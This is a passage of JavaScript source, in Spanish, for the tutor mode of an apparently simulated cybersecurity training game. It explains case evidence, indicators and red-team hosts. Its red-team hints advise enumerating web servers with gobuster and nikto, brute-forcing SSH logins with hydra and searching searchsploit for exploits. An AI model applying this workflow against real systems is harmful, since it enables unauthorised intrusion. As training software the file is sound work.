    lineas.push(`🎯 Acción esperada: ${acc}.`);
  }
  return lineas.join("\n");
}

function explicarIP(caso, ip) {
  const info = (caso.ips || {})[ip];
  if (info) {
    const lineas = [];
    lineas.push(`🖥 IP: ${ip}`);
    if (info.pais) lineas.push(`Ubicación: ${info.pais}`);
    if (info.asn) lineas.push(`ASN: ${info.asn}`);
    if (info.reputacion) lineas.push(`Reputación: ${info.reputacion}`);
    if (info.whois) lineas.push(`Whois: ${info.whois}`);
    const acc = accionSugerida(caso, ip);
    if (acc) lineas.push(`🎯 Acción esperada: ${acc}.`);
    return lineas.join("\n");
  }
  // Red team: host de la red simulada
  const h = (caso.red && caso.red.hosts && caso.red.hosts[ip]) || null;
  if (h) {
    const lineas = [];
    lineas.push(`🖥 HOST ${ip} (${h.hostname}) — ${h.os || "SO desconocido"}`);
    lineas.push("");
    lineas.push("Puertos abiertos (superficie de ataque):");
    for (const linea of String(h.puertos || "").split("\n")) {
      const m = /^(\d+)\/(\S+)\s+(\S+)/.exec(linea.trim());
      if (m) {
        lineas.push(`   ${m[1]}/${m[2]} — ${PUERTOS[m[1]] || "puerto no común: investiga qué servicio corre ahí"}`);
      } else if (linea.trim()) {
        lineas.push(`   ${linea.trim()}`);
      }
    }
    lineas.push("");
    lineas.push("🧭 Cómo atacarlo: enumera (gobuster/nikto) lo que esté web, prueba credenciales (hydra) en SSH, y busca la versión en searchsploit.");
    const acc = accionSugerida(caso, ip);
    if (acc) lineas.push(`🎯 Papel en el engagement: ${acc}.`);
    return lineas.join("\n");
  }
  return null;
}

function explicarURL(caso, url) {
  const desc = (caso.urls || {})[url];
  const lineas = [];
  lineas.push(`🔗 URL: ${url}`);
  if (desc) lineas.push(desc);
  else lineas.push("Sin descripción en la base del caso.");
  const acc = accionSugerida(caso, url);
  if (acc) lineas.push(`🎯 Acción esperada: ${acc}.`);
  return lineas.join("\n");
}

function explicarHash(caso, hash) {
  const info = (caso.hashes || {})[hash] || (caso.archivosVt && Object.values(caso.archivosVt).find((v) => v.hash === hash));
  if (!info) return null;
  const lineas = [];
  lineas.push(`🔑 HASH (${info.tipo || "n/d"}): ${hash}`);
  if (info.nombre) lineas.push(`Archivo: ${info.nombre}`);
  if (info.vt) {
    lineas.push(`🔬 VirusTotal: ${info.vt.deteccion || "n/d"} (${info.vt.maliciosos}/${info.vt.repos} motores)`);
    if (info.vt.familia) lineas.push(`   Familia: ${info.vt.familia}`);
  }
  if (info.nota) lineas.push(`Nota: ${info.nota}`);
  return lineas.join("\n");
}

function explicarWebRT(caso, url) {
  const w = (caso.web || {})[url];
  if (!w) return null;
  const lineas = [];
  lineas.push(`🌐 SERVIDOR WEB: ${url}`);
  if (w.raiz) lineas.push(`Raíz: ${w.raiz.split("\n")[0]}`);
  if (w.dirs && w.dirs.length) {
    lineas.push("");
    lineas.push("Directorios descubiertos (gobuster):");
    for (const d of w.dirs) lineas.push(`   ${d.startsWith("/") ? d : "/" + d}`);
    lineas.push("   Los paneles de administración (/admin, /backup, /upload) son hallazgos de severidad alta.");
  }
  if (w.nikto && w.nikto.length) {
    lineas.push("");
    lineas.push("Hallazgos de nikto (vulnerabilidades):");
    for (const n of w.nikto) lineas.push(`   + ${n}`);
  }
  if (w.login) {
    lineas.push("");
    lineas.push(`🔐 Hay login en ${w.login.url} — las credenciales se obtienen con fuerza bruta o de los datos filtrados.`);
  }
  const acc = accionSugerida(caso, url);
  if (acc) lineas.push(`🎯 Papel en el engagement: ${acc}.`);
  return lineas.join("\n");
}

function explicarArchivo(caso, ruta) {
  const res = leer(caso.fs, ruta);
  if (!res.ok) return null;
  const path = res.path;
  const contenido = res.contenido;
  const lineas = [];
  lineas.push(`📄 ARCHIVO: ${path}`);

  const match = TUTOR_ARCHIVOS.find((t) => t.re.test(path)) || null;
  if (match) {
    lineas.push("");
    lineas.push(`Qué es: ${match.queEs}`);
    lineas.push("");
    lineas.push(`Por qué importa: ${match.porQue}`);
    if (match.senales.length) {
      lineas.push("");
      lineas.push("Qué mirar:");
      for (const s of match.senales) lineas.push(`   - ${s}`);
    }
  } else {
    lineas.push("");
    lineas.push("Qué es: evidencia del caso sin plantilla genérica — léela y cruza los indicadores que contenga.");
  }

  const senales = analizarContenido(caso, contenido);
  if (senales.length) {
    lineas.push("");
    lineas.push("🔍 Señales detectadas en el contenido:");
    lineas.push(...senales);
  }

  const acc = accionSugerida(caso, path);
  if (acc) lineas.push(`🎯 Acción esperada sobre esta evidencia: ${acc}.`);
  return lineas.join("\n");
}

function menu(caso) {
  const lineas = [];
  lineas.push("📚 MODO TUTOR — ¿qué quieres que te explique?");
  lineas.push("");
  lineas.push("Sobre el caso:");
  lineas.push("   explicar caso            → historia del ataque, técnicas y qué se espera de ti");
  lineas.push("");
  lineas.push("Evidencias (archivos):");
  const fsKeys = Object.keys(caso.fs || {});
  for (const k of fsKeys.slice(0, 8)) lineas.push(`   explicar ${k}`);
  if (fsKeys.length > 8) lineas.push(`   … y ${fsKeys.length - 8} más (ls / para explorar)`);
  lineas.push("");
  lineas.push("Fuentes:");
  if ((caso.correos || []).length) lineas.push("   explicar mail <n>         → explica un correo del buzón");
  if ((caso.alertas || []).length) lineas.push("   explicar alerta <id>       → explica una alerta del SIEM");
  lineas.push("");
  lineas.push("Comandos:");
  lineas.push("   explicar comando          → lista de comandos explicables");
  lineas.push("   explicar comando <nombre> → qué hace y por qué importa (ej: explicar comando nmap)");
  lineas.push("");
  lineas.push("Indicadores de compromiso:");
  const doms = Object.keys(caso.dominios || {});
  const ips = Object.keys(caso.ips || {});
  const urls = Object.keys(caso.urls || {});
  const hashes = Object.keys(caso.hashes || {});
  for (const d of doms.slice(0, 3)) lineas.push(`   explicar ${d}`);
  for (const i of ips.slice(0, 3)) lineas.push(`   explicar ${i}`);
  for (const u of urls.slice(0, 2)) lineas.push(`   explicar ${u}`);
  if (hashes.length) lineas.push(`   explicar hash ${hashes[0].slice(0, 12)}…`);
  lineas.push("");
  lineas.push("(En red team también: explicar <ip> → puertos y servicios, explicar <url web> → servidor.)");
  return lineas.join("\n");
}

// ---------- Punto de entrada ----------
export function explicarTutor(caso, arg) {
  if (!caso) return "No hay caso activo. Inicia un caso primero.";
  const a = (arg || "").trim();
  if (!a) return menu(caso);

  const bajo = a.toLowerCase();

  // Caso completo
  if (bajo === "caso" || bajo === "caso actual") return explicarCaso(caso);

  // mail / correo <n>
  let m = /^(mail|correo)\s+(\d+)$/.exec(bajo);
  if (m) return explicarMail(caso, parseInt(m[2], 10));
  if (bajo === "mail" || bajo === "correo") {
    const n = (caso.correos || []).length;
    return n ? `Hay ${n} correos. Usa \`explicar mail 1\`…${n}.` : "No hay correos en este caso.";
  }

  // alerta <id>
  m = /^alerta\s+(.+)$/.exec(bajo);
  if (m) return explicarAlerta(caso, m[1]);

  // hash <hash>
  m = /^hash\s+(.+)$/.exec(bajo);
  if (m) return explicarHash(caso, m[1].toLowerCase()) || `No hay información del hash ${m[1]} en la base del caso.`;

  // comando <nombre>
  if (bajo === "comando" || bajo === "cmd") return listaComandos();
  m = /^(comando|cmd)\s+(.+)$/.exec(bajo);
  if (m) return explicarComando(m[2]);

  // Ruta de archivo (empieza por / o coincide con una clave del fs)
  if (bajo.startsWith("/")) {
    const ex = explicarArchivo(caso, a);
    if (ex) return ex;
  }
  if (!bajo.startsWith("/")) {
    const clave = Object.keys(caso.fs || {}).find((k) => k.toLowerCase().endsWith(bajo));
    if (clave) return explicarArchivo(caso, clave);
  }

  // Indicadores
  if ((caso.dominios || {})[bajo]) return explicarDominio(caso, bajo);
  if ((caso.ips || {})[bajo]) return explicarIP(caso, bajo);
  if ((caso.urls || {})[bajo]) return explicarURL(caso, bajo);
  if ((caso.hashes || {})[bajo]) return explicarHash(caso, bajo);

  // Red team: host por IP o hostname, web por URL
  if (caso.red && caso.red.hosts && caso.red.hosts[bajo]) return explicarIP(caso, bajo);
  const hostRT = caso.red && caso.red.hosts && Object.values(caso.red.hosts).find((h) => h.hostname && h.hostname.toLowerCase() === bajo);
  if (hostRT) return explicarIP(caso, Object.keys(caso.red.hosts).find((k) => caso.red.hosts[k] === hostRT));
  if ((caso.web || {})[bajo]) return explicarWebRT(caso, bajo);

  // Último intento: como archivo relativo
  const ex2 = explicarArchivo(caso, a);
  if (ex2) return ex2;

  return (
    `No sé explicar «${arg}». Cosas que puedo explicar: \`explicar\` (menú), \`explicar caso\`, ` +
    `\`explicar <ruta>\`, \`explicar mail <n>\`, \`explicar alerta <id>\`, ` +
    `\`explicar <dominio|ip|url>\`, \`explicar hash <hash>\`.`
  );
}
